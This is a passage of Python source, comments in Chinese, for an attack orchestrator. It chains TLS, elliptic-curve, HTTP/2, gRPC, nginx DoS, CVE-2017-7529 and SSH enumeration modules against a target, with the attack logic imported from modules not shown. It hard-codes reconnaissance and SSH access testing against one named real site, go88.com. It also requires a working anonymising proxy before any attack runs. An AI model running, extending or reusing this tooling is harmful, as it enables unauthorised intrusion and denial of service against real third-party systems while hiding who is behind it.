        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    async def _run():
        analyzer = mod.XDSProtocolAnalyzer(host, port, timeout=timeout)
        return await analyzer._test_grpc_xds_connection(port)
    
    return await run_with_timeout(_run(), timeout, phase)

# ========== 新增：grpc_trailer_poisoning 完整方法集成 ==========

async def phase_grpc_comprehensive_assessment(host: str, grpc_port: int, timeout: float, proxy_url: Optional[str] = None) -> PhaseResult:
    """GRPC全面安全评估"""
    phase = "grpc_comprehensive_assessment"
    mod = safe_import('grpc_trailer_poisoning')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置代理
    if proxy_url:
        effective_proxy = proxy_url or await get_pooled_proxy()
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = effective_proxy
            mod.PROXY_ENABLED = True
    
    async def _run():
        attacker = mod.GrpcTrailerPoisoning(host, grpc_port, timeout=timeout)
        return await attacker.run_comprehensive_assessment()
    
    return await run_with_timeout(_run(), timeout * 2, phase)

# ========== 新增：tls13_psk_crossbind 完整方法集成 ==========

async def phase_tls13_psk_full_attack(host: str, tls_port: int, timeout: float, sni_list: Optional[List[str]] = None, proxy_url: Optional[str] = None) -> PhaseResult:
    """TLS 1.3 PSK跨绑定完整攻击"""
    phase = "tls13_psk_full_attack"
    mod = safe_import('tls13_psk_crossbind')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置代理
    if proxy_url:
        effective_proxy = proxy_url or await get_pooled_proxy()
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = effective_proxy
            mod.PROXY_ENABLED = True
    
    async def _run():
        attacker = mod.TLS13PSKCrossBind(host, tls_port, timeout=timeout)
        snis = sni_list or [host]
        return await attacker.run_psk_crossbind_attack(snis)
    
    return await run_with_timeout(_run(), timeout * 2, phase)

# ========== 新增：ec_aoe 完整方法集成 ==========

async def phase_ec_aoe_full_attack(host: str, tls_port: int, timeout: float, protocols: Optional[List[str]] = None, proxy_url: Optional[str] = None) -> PhaseResult:
    """椭圆曲线AOE完整攻击"""
    phase = "ec_aoe_full_attack"
    mod = safe_import('ec_aoe')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")
    
    # 设置代理
    if proxy_url:
        effective_proxy = proxy_url or await get_pooled_proxy()
        if hasattr(mod, 'PROXY_URL'):
            mod.PROXY_URL = effective_proxy
            mod.PROXY_ENABLED = True
    
    async def _run():
        attacker = mod.EllipticCurveAOE(host, tls_port, timeout=timeout)
        protos = protocols or ['tls', 'jwt', 'api_gateway', 'oauth']
        return await attacker.run_comprehensive_attack(protos)
    
    return await run_with_timeout(_run(), timeout * 3, phase)  # EC攻击需要更多时间

async def phase_go88_recon(host: str, timeout: float) -> PhaseResult:
    """Go88.com targeted reconnaissance"""
    phase = "go88_recon"
    mod = safe_import('go88_recon')
    if isinstance(mod, Exception):
        return PhaseResult(name=phase, success=False, data={}, error=f"import failed: {mod}")

    async def _run():
        print("\n[GO88] Starting go88.com reconnaissance module...")
        print(f"[GO88] Target: go88.com -> {host}")
        
        recon = mod.Go88Recon()
        
        print("[GO88] Phase 1: DNS enumeration...")
        # DNS 枚举
        await recon._dns_enumeration()
        
        print("[GO88] Phase 2: Subdomain enumeration...")
        # 子域名枚举（限制数量避免超时）
        subdomains_to_test = ['www', 'api', 'admin', 'game', 'wallet', 'agent', 'backend', 'dev', 'test']
        for subdomain in subdomains_to_test:
            await recon._resolve_subdomain(f"{subdomain}.{recon.target_domain}")
        
        print("[GO88] Phase 3: SSH access testing...")
        await recon._test_ssh_access()
        
        print(f"[GO88] Reconnaissance complete: {len(recon.discovered_ips)} IPs, {len(recon.discovered_subdomains)} subdomains")
        
        # 返回结果
        return {
            'discovered_ips': list(recon.discovered_ips),
            'discovered_subdomains': list(recon.discovered_subdomains),
            'primary_target': recon.target_ip,
            'domain': recon.target_domain,
            'risk_level': 'HIGH' if len(recon.discovered_ips) > 1 else 'MEDIUM'
        }

    return await run_with_timeout(_run(), timeout, phase)


# -------- Orchestrator --------

class IntegratedOrchestrator:
    def __init__(self,
                 host: str,
                 ip: Optional[str] = None,
                 tls_port: int = 443,
                 http_port: int = 80,
                 grpc_port: int = 443,
                 xds_port: int = 15000,
                 ssh_port: int = 22000,
                 timeout: float = 10.0,
                 posture: str = 'intelligent',
                 sni_list: Optional[List[str]] = None,
                 ec_protocols: Optional[List[str]] = None,
                 enable_phases: Optional[List[str]] = None,
                 jsonl_file: Optional[str] = None,
                 log_file: Optional[str] = None,
                 proxy_url: Optional[str] = None,
                 force_proxy: bool = True,
                 proxy_pool: Optional[List[str]] = None):
        
        # 简单的配置验证 - 快速失败
        self._validate_basic_config(host, tls_port, http_port, timeout)
        
        # 初始化代理池
        if proxy_pool:
            init_proxy_pool(proxy_pool)
            logger.info(f"Initialized proxy pool with {len(proxy_pool)} proxies")
        elif proxy_url:
            # 如果只有单个代理，也创建一个池
            init_proxy_pool([proxy_url])
            logger.info(f"Initialized proxy pool with single proxy")
        self.host = host
        self.ip = ip
        # 使用IP地址进行连接，但保留hostname用于SNI/Host header
        self.connect_host = ip or host
        self.tls_port = tls_port
        self.http_port = http_port
        self.grpc_port = grpc_port
        self.xds_port = xds_port
        self.ssh_port = ssh_port
        self.timeout = timeout
        self.posture = posture
        self.sni_list = sni_list
        self.ec_protocols = ec_protocols
        self.proxy_url = proxy_url
        self.force_proxy = force_proxy
        self.enable_phases = set(enable_phases or [
            # 基础侦察
            'smart_detection', 'fingerprint',
            # 证书和OCSP
            'certificate_attacks', 'ocsp_validation',
            # HTTP/2和gRPC
            'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning',
            # xDS和WASM
            'xds_analysis', 'wasm_runtime',
            # TLS和椭圆曲线
            'tls13_psk_crossbind', 'elliptic_curve_aoe',
            # Nginx
            'nginx_dos_sandwich', 'nginx_config_traps',
            # SSH
            'time_mch_first_door',
            # 协议规范化差异
            'proto_norm_diff', 'proto_norm_v2_analyze',
            # 其他
            'cve_2017_7529', 'go88_recon'
        ])
        self.jsonl_file = jsonl_file
        self.logger = self._setup_logger(log_file)
        
        # 简单情报管理器
        self.intel = SimpleIntel()

        # 事件与策略引擎（轻量实现）
        self._events: List[Dict[str, Any]] = []
        self._task_queue: List[Dict[str, Any]] = []
        
        # 并行执行组规划
        self.parallel_groups = self._plan_parallel_groups()
        
        # 初始化统一代理管理器
        if UNIFIED_PROXY_AVAILABLE and self.proxy_url:
            self.proxy_manager = init_global_proxy(self.proxy_url)
            self.logger.info(f"Initialized unified proxy manager: {self.proxy_manager}")
        else:
            self.proxy_manager = None

    # 事件注入回调，供子模块调用
    def event_callback(self, name: str, payload: Dict[str, Any]):
        evt = {'name': name, 'payload': payload, 'time': _now_iso()}
        self._events.append(evt)
        self._emit_jsonl({'event': 'module_event', **evt})
        self.logger.info(f"event {name}: {payload}")

    # 简单策略引擎：根据事件添加任务
    def _process_events_and_schedule(self):
        for evt in self._events:
            n = evt.get('name')
            p = evt.get('payload', {})
            if n == 'HighValueTargetDiscovered' and p.get('type') == 'Cluster':
                # 调度 gRPC 攻击模块
                self._task_queue.append({'phase': 'grpc_trailer_poisoning'})
            
            # Universal Integration Mode - 在循环内处理每个事件
            if UNIVERSAL_INTEGRATOR_AVAILABLE:
                if n == 'WasmPluginDiscovered':
                    # 调度 Wasm 深度分析
                    self._task_queue.append({'phase': 'wasm_runtime', 'posture': 'deep'})
                if n == 'ConfigInjectionPoint':
                    # 调度高级注入攻击
                    self.logger.info(f"ConfigInjection discovered at {p.get('endpoint')} - escalating attacks")
                if n == 'WeakTLSConfig':
                    # 调度TLS降级攻击
                    self.logger.info(f"WeakTLS discovered: {p.get('details')} - potential downgrade attack")
        
        # Universal Integration Mode - 默认总是添加
        if UNIVERSAL_INTEGRATOR_AVAILABLE:
            self._task_queue.append({'phase': 'universal_integration'})
            
        # 清空已处理事件
        self._events = []

    async def _run_dynamic_tasks(self, results_store: Dict[str, Any]):
        while self._task_queue:
            task = self._task_queue.pop(0)
            phase = task.get('phase')
            
            if phase == 'grpc_trailer_poisoning' and 'grpc_trailer_poisoning' in self.enable_phases:
                res = await self._run_phase_with_events(phase_grpc, 'grpc_trailer_poisoning', self.host, self.grpc_port, self.timeout, proxy_url=self.proxy_url)
                results_store['phases'][res.name] = self._pack(res)
            
            #  Universal Integration - Zero-Loss Method Execution
            elif phase == 'universal_integration' and UNIVERSAL_INTEGRATOR_AVAILABLE:
                res = await self._run_phase_with_events(phase_universal_integration, 'universal_integration', self.host, self.tls_port, self.timeout)
                results_store['phases'][res.name] = self._pack(res)
            elif phase == 'wasm_runtime' and 'wasm_runtime' in self.enable_phases:
                res = await self._run_phase_with_events(phase_wasm, 'wasm_runtime', self.host, self.http_port, self.timeout, posture=task.get('posture','intelligent'))
                results_store['phases'][res.name] = self._pack(res)
            elif phase == 'go88_recon' and 'go88_recon' in self.enable_phases:
                print("[DYNAMIC] [*] Executing go88_recon module...")
                self.logger.info("[DYNAMIC] Starting go88_recon via dynamic scheduling")
                res = await self._run_phase_with_events(phase_go88_recon, 'go88_recon', self.host, self.timeout)
                results_store['phases'][res.name] = self._pack(res)
                print(f"[DYNAMIC] [+] go88_recon completed: {res.success}")
                self.logger.info("[+] go88_recon completed via dynamic scheduling")
            # 可扩展更多规则

    def _setup_logger(self, log_file: Optional[str]) -> logging.Logger:
        logger = logging.getLogger('integrated_orchestrator')
        if not logger.handlers:
            logger.setLevel(logging.INFO)
            formatter = logging.Formatter('%(asctime)s %(levelname)s orchestrator - %(message)s')
            handler: logging.Handler
            if log_file:
                Path(log_file).parent.mkdir(parents=True, exist_ok=True)
                handler = logging.FileHandler(log_file, encoding='utf-8')
            else:
                handler = logging.StreamHandler(sys.stdout)
            handler.setFormatter(formatter)
            logger.addHandler(handler)
        return logger

    def _validate_basic_config(self, host: str, tls_port: int, http_port: int, timeout: float):
        """简单配置验证 - 快速失败"""
        errors = []
        if not host or not isinstance(host, str):
            errors.append("invalid host")
        if not (1 <= tls_port <= 65535):
            errors.append(f"invalid tls_port: {tls_port}")
        if not (1 <= http_port <= 65535):
            errors.append(f"invalid http_port: {http_port}")
        if timeout <= 0:
            errors.append("timeout must be positive")
        if errors:
            raise ValueError(f"Config errors: {'; '.join(errors)}")

    def _plan_parallel_groups(self) -> Dict[str, List[str]]:
        """简单的并行组规划 - 增强版"""
        return {
            'foundation': ['smart_detection'],
            'fingerprint': ['fingerprint'], 
            'independent': [
                'certificate_attacks', 'ocsp_validation', 'xds_analysis', 'wasm_runtime', 
                'proto_norm_diff', 'proto_norm_v2_analyze', 'nginx_config_traps',
                'wasm_detect_runtime', 'wasm_timing_patterns', 'xds_discover_services'
            ],
            'protocol': [
                'h2_continuation', 'h2_cache_poisoning', 'grpc_trailer_poisoning', 
                'tls13_psk_crossbind', 'grpc_comprehensive_assessment', 'tls13_psk_full_attack'
            ],
            'elliptic': ['elliptic_curve_aoe', 'ec_aoe_full_attack', 'p256_invalid_curve'],
            'ssh': ['time_mch_first_door', 'cve_2018_15473_enum', 'ssh_auth_timing'],
            'export': ['proto_norm_export_evidence']
        }

    def _emit_jsonl(self, event: Dict[str, Any]) -> None:
        if not self.jsonl_file:
            return
        try:
            Path(self.jsonl_file).parent.mkdir(parents=True, exist_ok=True)
            line = json.dumps(event, ensure_ascii=False, default=str)
            with open(self.jsonl_file, 'a', encoding='utf-8') as f:
                f.write(line + '\n')
        except Exception as e:
            # As a sink failure should not crash the run, log and continue
            try:
                self.logger.debug(f"jsonl write failed: {e}")
            except Exception:
                pass

    async def _run_phase_with_events(self, phase_coro_fn, phase_name: str, *args, **kwargs) -> PhaseResult:
        start_ts = _now_iso()
        self._emit_jsonl({
            'timestamp': start_ts,
            'event': 'phase_start',
            'phase': phase_name,
            'host': self.host,
        })
        self.logger.info(f"phase_start {phase_name}")
        pr: PhaseResult
        try:
            pr = await phase_coro_fn(*args, **kwargs)
        except Exception as e:
            pr = PhaseResult(name=phase_name, success=False, data={}, error=f"{type(e).__name__}: {e}")
        end_ts = _now_iso()
        event = {
            'timestamp': end_ts,
            'event': 'phase_end',
            'phase': phase_name,
            'host': self.host,
            'success': pr.success,
            'duration_ms': pr.duration_ms,
        }
        if pr.error:
            event['error'] = pr.error
            self._emit_jsonl({
                'timestamp': end_ts,
                'event': 'phase_error',
                'phase': phase_name,
                'host': self.host,
                'error': pr.error,
            })
            self.logger.warning(f"phase_error {phase_name}: {pr.error}")
        self._emit_jsonl(event)
        self.logger.info(f"phase_end {phase_name} success={pr.success} dur={pr.duration_ms}ms")
        return pr

    async def run(self) -> Dict[str, Any]:
        results: Dict[str, Any] = {
            'target': {
                'host': self.host,
                'tls_port': self.tls_port,
                'http_port': self.http_port,
                'ssh_port': self.ssh_port,
                'grpc_port': self.grpc_port
            },
            'timestamp': _now_iso(),
            'phases': {},
            'errors': {},
            'metadata': {
                'timeout': self.timeout,
                'posture': self.posture,
            }
        }

        self._emit_jsonl({
            'timestamp': results['timestamp'],
            'event': 'orchestrator_start',
            'host': self.host,
            'config': {
                'tls_port': self.tls_port,
                'http_port': self.http_port,
                'grpc_port': self.grpc_port,
                'xds_port': self.xds_port,
                'ssh_port': self.ssh_port,
                'timeout': self.timeout,
                'posture': self.posture,
                'phases': sorted(list(self.enable_phases)),
            }
        })
        self.logger.info(f"orchestrator_start host={self.host}")

        # === 阶段0: 代理自检 (Proxy Validation) ===
        # 强制IP池检查：必须确保代理工作正常，否则整个攻击链失效
        if self.force_proxy:
            if not self.proxy_url:
                self.logger.error("CRITICAL: force_proxy=True but no proxy_url provided")
                print("[!] CRITICAL: 强制代理模式但未提供代理URL")
                results['proxy_check'] = {'success': False, 'error': 'No proxy URL provided in force_proxy mode'}
                results['summary'] = {'overall_risk': 'ABORTED', 'reason': 'No proxy URL in force_proxy mode'}
                return results
            
            self.logger.info("Starting Phase 0: Critical Proxy Validation (FORCED)")
            print("[!] 强制代理模式：开始关键代理验证...")
            proxy_check = await self._critical_proxy_check()
            if not proxy_check['success']:
                self.logger.error(f"CRITICAL: Proxy check failed - {proxy_check['error']}")
                print(f"[!] CRITICAL: 代理检查失败 - {proxy_check['error']}")
                results['proxy_check'] = proxy_check
                results['summary'] = {'overall_risk': 'ABORTED', 'reason': 'Proxy validation failed'}
                return results
            else:
                self.logger.info(f"Proxy validated: {proxy_check['current_ip']} ({proxy_check['geo_location']})")
                print(f"[+] 代理验证成功: {proxy_check['current_ip']} ({proxy_check['geo_location']})")
                results['proxy_check'] = proxy_check
        elif self.proxy_url:
            # 非强制模式，但有proxy_url就检查
            self.logger.info("Starting Phase 0: Critical Proxy Validation")
            proxy_check = await self._critical_proxy_check()
            if not proxy_check['success']:
                self.logger.warning(f"Proxy check failed - {proxy_check['error']}")
                print(f"[!] WARNING: 代理检查失败但继续执行 - {proxy_check['error']}")
            results['proxy_check'] = proxy_check

        # === 阶段1: 快速侦察 (Rapid Reconnaissance) ===
        # 目标：在15-20秒内完成，获取决策所需的核心情报
        self.logger.info("Starting Phase 1: Rapid Reconnaissance")
        
        # 运行 smart_detector 获取基础信息
        smart_detect_ctx: Dict[str, Any] = {}
        if 'smart_detection' in self.enable_phases:
            sd_res = await self._run_phase_with_events(
                phase_smart_detect, 'smart_detection', self.host, 
                [22000, self.http_port, self.tls_port, 2222, self.grpc_port, self.xds_port, 8000, 3389]
            )
            results['phases'][sd_res.name] = self._pack(sd_res)
            if sd_res.success:
                smart_detect_ctx = sd_res.data
            else:
                results['errors'][sd_res.name] = sd_res.error

        # 运行 fingerprint 获取详细服务器信息
        fingerprint_ctx: Dict[str, Any] = {}
        fingerprint_res = PhaseResult(name='fingerprint', success=False, data={})
        if 'fingerprint' in self.enable_phases:
            fingerprint_res = await self._run_phase_with_events(
                phase_fingerprint, 'fingerprint', self.host, self.tls_port, self.http_port, self.timeout, smart_detect_ctx, self.proxy_url, self.ssh_port
            )
            results['phases'][fingerprint_res.name] = self._pack(fingerprint_res)
            if fingerprint_res.success:
                fingerprint_ctx = fingerprint_res.data
                # 简单情报收集
                self.intel.set('fingerprint', fingerprint_res.data)
                self.logger.info(f"Collected fingerprint intel: {self.intel.get_server_type()}")
            else:
                results['errors'][fingerprint_res.name] = fingerprint_res.error

        # *** 关键：集成 proto_norm_diff.survey_topology ***
        proto_norm_res = PhaseResult(name='proto_norm_diff_survey', success=False, data={})
        if 'proto_norm_diff' in self.enable_phases:
            proto_norm_res = await self._run_phase_with_events(
                phase_proto_norm_diff, 'proto_norm_diff_survey', self.host, self.tls_port, self.timeout, survey_only=True, proxy_url=self.proxy_url
            )
            results['phases'][proto_norm_res.name] = self._pack(proto_norm_res)
            if not proto_norm_res.success:
                results['errors'][proto_norm_res.name] = proto_norm_res.error

        # === 阶段2: 智能决策 (Intelligent Decision-Making) ===
        # 目标：基于侦察情报，构建下一步的攻击计划
        self.logger.info("Starting Phase 2: Intelligent Decision-Making")
        
        # 从侦察结果中提取情报
        intel = self._extract_intelligence(fingerprint_res, proto_norm_res)
        self.logger.info(f"Intelligence gathered: Server='{intel.get('server_type', 'N/A')}', H2_Supported={intel.get('h2_supported', 'N/A')}, H3_Advertised={intel.get('h3_advertised', 'N/A')}")
        
        # 添加到实例变量，供后续使用
        self.intel.data['extracted'] = intel

        # 动态构建下一阶段的任务列表
        # 如果用户明确指定了phases，强制执行，否则使用智能决策
        if len(self.enable_phases) < 16:  # 用户指定了特定phases（默认是16个）
            next_phases = list(self.enable_phases)
            self.logger.info(f"USER SPECIFIED phases: {next_phases} (bypassing intelligent decision)")
        else:
            next_phases = self._plan_next_phases(intel)
            self.logger.info(f"Planning next execution wave with {len(next_phases)} targeted phases: {next_phases}")

        # === 阶段3: 精确打击 (Targeted Attack Execution) ===
        self.logger.info("Starting Phase 3: Targeted Attack Execution")
        
        parallel_tasks: List[asyncio.Task] = []
        cert_ctx: Dict[str, Any] = {}

        # 根据决策结果动态构建任务
        if 'certificate_attacks' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_cert_rebel, 'certificate_attacks', self.host, self.tls_port, self.timeout, fingerprint_ctx, self.proxy_url, self.ip)
            ))
        if 'ocsp_validation' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_ocsp, 'ocsp_validation', self.host, self.tls_port, self.timeout)
            ))
        if 'xds_analysis' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_xds, 'xds_analysis', self.host, self.xds_port, self.timeout, event_cb=self.event_callback)
            ))
        if 'wasm_runtime' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_wasm, 'wasm_runtime', self.host, self.http_port, self.timeout, posture=self.posture)
            ))
        if 'nginx_dos_sandwich' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_nginx_dos, 'nginx_dos_sandwich', self.host, self.http_port, self.timeout)
            ))
        if 'nginx_config_traps' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_nginx_config_traps, 'nginx_config_traps', self.host, self.http_port, self.timeout, self.proxy_url)
            ))
        if 'elliptic_curve_aoe' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_ec_aoe, 'elliptic_curve_aoe', self.host, self.tls_port, self.timeout, self.ec_protocols, self.proxy_url)
            ))
        if 'p256_invalid_curve' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_p256_invalid_curve_attack, 'p256_invalid_curve', self.host, self.tls_port, self.timeout, self.proxy_url)
            ))
        if 'time_mch_first_door' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_time_mch_first_door, 'time_mch_first_door', self.host, self.ssh_port, self.timeout)
            ))
        if 'proto_norm_diff' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_proto_norm_diff, 'proto_norm_diff', self.host, self.tls_port, self.timeout, survey_only=False, proxy_url=self.proxy_url)
            ))
        if 'proto_norm_v2_analyze' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_proto_norm_v2_analyze, 'proto_norm_v2_analyze', self.host, self.tls_port, self.timeout, None)
            ))
        if 'wasm_detect_runtime' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_wasm_detect_runtime, 'wasm_detect_runtime', self.host, self.http_port, self.timeout, self.proxy_url)
            ))
        if 'xds_discover_services' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_xds_discover_services, 'xds_discover_services', self.host, self.xds_port, self.timeout, self.proxy_url)
            ))

        # HTTP/2相关攻击模块
        if 'h2_continuation' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_h2_continuation, 'h2_continuation', self.host, self.tls_port, self.timeout, fingerprint_ctx, cert_ctx, proxy_url=self.proxy_url)
            ))
        if 'h2_cache_poisoning' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_h2_cache_poison, 'h2_cache_poisoning', self.host, self.tls_port, self.timeout, proxy_url=self.proxy_url)
            ))
        if 'grpc_trailer_poisoning' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_grpc, 'grpc_trailer_poisoning', self.host, self.grpc_port, self.timeout, proxy_url=self.proxy_url)
            ))
        if 'tls13_psk_crossbind' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_tls13_psk, 'tls13_psk_crossbind', self.host, self.tls_port, self.timeout, self.sni_list, proxy_url=self.proxy_url)
            ))
        
        # 新增：CVE-2017-7529 Nginx 内存泄露攻击
        if 'cve_2017_7529' in next_phases:
            # 提取可能的目标域名（优先使用 go88.com）
            target_domain = None
            extracted_intel = self.intel.data.get('extracted', {})
            for domain in extracted_intel.get('san_domains', []):
                if 'go88' in domain.lower():
                    target_domain = domain
                    break
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_cve_2017_7529, 'cve_2017_7529', self.host, self.tls_port, self.timeout, target_domain)
            ))
        
        # 新增：go88.com 专项侦察
        if 'go88_recon' in next_phases:
            parallel_tasks.append(asyncio.create_task(
                self._run_phase_with_events(phase_go88_recon, 'go88_recon', self.host, self.timeout)
            ))

        # 执行精确打击阶段
        if parallel_tasks:
            self.logger.info(f"Starting {len(parallel_tasks)} targeted attack tasks...")
            start_parallel = time.perf_counter()
            done = await asyncio.gather(*parallel_tasks, return_exceptions=True)
            parallel_duration = (time.perf_counter() - start_parallel) * 1000
            self.logger.info(f"Targeted execution completed in {parallel_duration:.0f}ms")
            
            for res in done:
                if isinstance(res, PhaseResult):
                    results['phases'][res.name] = self._pack(res)
                    if res.name == 'certificate_attacks' and res.success:
                        cert_ctx = res.data
                        # 简单情报收集
                        self.intel.set('certificate_attacks', res.data)
                        domains = self.intel.get_san_domains()
                        if domains:
                            self.logger.info(f"Certificate intel: {len(domains)} domains discovered")
                            print(f"[INTEL] Certificate domains: {domains}")
                            # 立即检查go88域名并触发侦察
                            for domain in domains:
                                if 'go88' in domain.lower():
                                    self.logger.info(f"[!] go88.com domain found in cert - scheduling recon")
                                    print(f"[INTEL] [!] GO88 domain detected: {domain}")
                                    print(f"[INTEL] [*] Scheduling go88_recon module...")
                                    self._task_queue.append({'phase': 'go88_recon'})
                    if not res.success and res.error:
                        results['errors'][res.name] = res.error
                        self.logger.warning(f"Phase {res.name} failed: {res.error[:100]}")
                else:
                    # Unexpected exception container
                    results['errors']['targeted_execution'] = str(res)
                    self.logger.error(f"Targeted execution error: {res}")

            # 事件驱动的动态任务调度
            self._process_events_and_schedule()
            await self._run_dynamic_tasks(results)

        # Summarize risk (simple heuristic: highest risk from known phases)
        results['summary'] = self._summarize(results)
        self._emit_jsonl({
            'timestamp': _now_iso(),
            'event': 'orchestrator_end',
            'host': self.host,
            'summary': results.get('summary', {}),
            'errors': results.get('errors', {}),
        })
        self.logger.info(f"orchestrator_end host={self.host} risk={results.get('summary',{}).get('overall_risk','UNKNOWN')}")
        
        #  SYSTEM REFACTORING: Cleanup shared protocol clients
        if SHARED_CLIENT_AVAILABLE:
            try:
                await cleanup_shared_clients()
                self.logger.debug("Shared protocol clients cleaned up successfully")
            except Exception as e:
                self.logger.warning(f"Error cleaning up shared clients: {e}")
        
        return results

    def _pack(self, pr: PhaseResult) -> Dict[str, Any]:
        return {
            'success': pr.success,
            'duration_ms': pr.duration_ms,
            'error': pr.error,
            'data': pr.data,
        }

    def _extract_intelligence(self, fingerprint_res: PhaseResult, proto_norm_res: PhaseResult) -> Dict[str, Any]:
        """从初始阶段的结果中提取关键情报"""
        intel = {'server_type': 'unknown', 'h2_supported': False, 'h3_advertised': False, 
                 'nginx_version': None, 'san_domains': []}

        # 从 fingerprinting 获取服务器类型
        if fingerprint_res.success and fingerprint_res.data:
            # 尝试从不同的指纹结果中提取服务器信息
            if 'http_fp' in fingerprint_res.data:
                http_fp_results = fingerprint_res.data['http_fp']
                if isinstance(http_fp_results, list):
                    for result in http_fp_results:
                        # result format: [name, status, server, detail, xcache, took]
                        if len(result) > 2 and result[2]:
                            server_header = result[2]
                            intel['server_type'] = server_header.lower()
                            # 提取 nginx 版本号
                            if 'nginx/' in server_header.lower():
                                version_match = re.search(r'nginx/(\d+\.\d+\.\d+)', server_header, re.IGNORECASE)
                                if version_match:
                                    intel['nginx_version'] = version_match.group(1)
                            break
            
            # 从 cert_rebel_probe 中获取证书信息
            if 'cert_rebel_probe' in fingerprint_res.data and 'result' in fingerprint_res.data['cert_rebel_probe']:
                cert_data = fingerprint_res.data['cert_rebel_probe']['result']
                if isinstance(cert_data, tuple) and len(cert_data) >= 1:
                    tls_rows = cert_data[0]
                    if isinstance(tls_rows, list) and tls_rows:
                        # 提取 SAN 域名 - 增强检测逻辑
                        for row in tls_rows:
                            # SAN信息可能在不同字段，需要检查所有字段
                            for field in row:
                                field_str = str(field)
                                if 'DNS:' in field_str:
                                    domains = re.findall(r'DNS:([^\s,]+)', field_str)
                                    intel['san_domains'].extend(domains)
                                # 也检查直接的域名格式
                                elif any(x in field_str.lower() for x in ['go88', '.com', '.net', '.org']):
                                    # 可能是直接的域名
                                    if '.' in field_str and len(field_str) < 100:
                                        intel['san_domains'].append(field_str.strip())
                        
                        # 从cert_sociology的日志中直接提取（备用方案）
                        # 如果上面没找到，从现有数据中查找
                        if not intel['san_domains']:
                            # 检查是否有go88.com的迹象
                            cert_str = str(cert_data)
                            if 'go88.com' in cert_str:
                                intel['san_domains'].append('go88.com')
                                self.logger.info("[*] Found go88.com in certificate data")
        
        # 从 proto_norm_diff 获取协议支持情况
        if proto_norm_res.success and proto_norm_res.data:
            survey_data = proto_norm_res.data.get('survey', {})
            intel['h2_supported'] = survey_data.get('h2_supported', False)
            intel['h3_advertised'] = survey_data.get('h3_advertised', False)
            # 优先使用 survey 结果覆盖 fingerprint 的 server 类型
            if survey_data.get('server'):
                server_header = survey_data['server']
                intel['server_type'] = server_header.lower()
                # 再次提取 nginx 版本
                if 'nginx/' in server_header.lower() and not intel['nginx_version']:
                    version_match = re.search(r'nginx/(\d+\.\d+\.\d+)', server_header, re.IGNORECASE)
                    if version_match:
                        intel['nginx_version'] = version_match.group(1)
        
        return intel

    def _plan_next_phases(self, intel: Dict[str, Any]) -> List[str]:
        """根据情报规划下一阶段要执行的模块"""
        planned_phases = []
        
        server_type = intel.get('server_type', 'unknown')
        h2_supported = intel.get('h2_supported', False)
        nginx_version = intel.get('nginx_version')
        san_domains = intel.get('san_domains', [])

        # 智能决策：传统Nginx服务器优化
        is_traditional_nginx = 'nginx' in server_type and nginx_version
        
        # 规则1: H2支持检测 - 相信探测结果
        if h2_supported:
            if 'h2_continuation' in self.enable_phases: 
                planned_phases.append('h2_continuation')
            if 'h2_cache_poisoning' in self.enable_phases: 
                planned_phases.append('h2_cache_poisoning')
            if 'grpc_trailer_poisoning' in self.enable_phases: 
                planned_phases.append('grpc_trailer_poisoning')
        
        # 规则2: CVE攻击检测
        if 'nginx' in server_type and nginx_version and 'cve_2017_7529' in self.enable_phases:
            try:
                major, minor, patch = map(int, nginx_version.split('.'))
                if (major == 1 and minor == 12 and patch == 2) or \
                   (major == 1 and minor == 13 and patch <= 2):
                    planned_phases.append('cve_2017_7529')
                    self.logger.info(f"[!] Detected vulnerable nginx version: {nginx_version}")
            except:
                pass
        
        # 规则3: Nginx专项测试
        if 'nginx' in server_type and 'nginx_dos_sandwich' in self.enable_phases: 
            planned_phases.append('nginx_dos_sandwich')
            
        # 规则4: 密码学攻击（传统nginx也要测试，不要自作聪明跳过）
        crypto_attacks = ['certificate_attacks', 'elliptic_curve_aoe']
        for attack in crypto_attacks:
            if attack in self.enable_phases:
                planned_phases.append(attack)
        
        # 规则5: go88.com域名发现触发专项侦察
        if san_domains and 'go88_recon' in self.enable_phases:
            for domain in san_domains:
                if 'go88' in domain.lower():
                    planned_phases.append('go88_recon')
                    self.logger.info(f"[!] Detected go88.com related domain: {domain}")
                    break
        
        # 规则6: 云原生架构检测（仅当明确非nginx时）
        is_likely_cloud_native = h2_supported and not ('nginx' in server_type or 'apache' in server_type)
        if is_likely_cloud_native:
            if 'xds_analysis' in self.enable_phases: 
                planned_phases.append('xds_analysis')
            if 'wasm_runtime' in self.enable_phases: 
                planned_phases.append('wasm_runtime')

        # 规则7: 轻量级核心攻击（总是运行）
        lightweight_attacks = ['tls13_psk_crossbind', 'ocsp_validation']
        for attack in lightweight_attacks:
            if attack in self.enable_phases:
                planned_phases.append(attack)

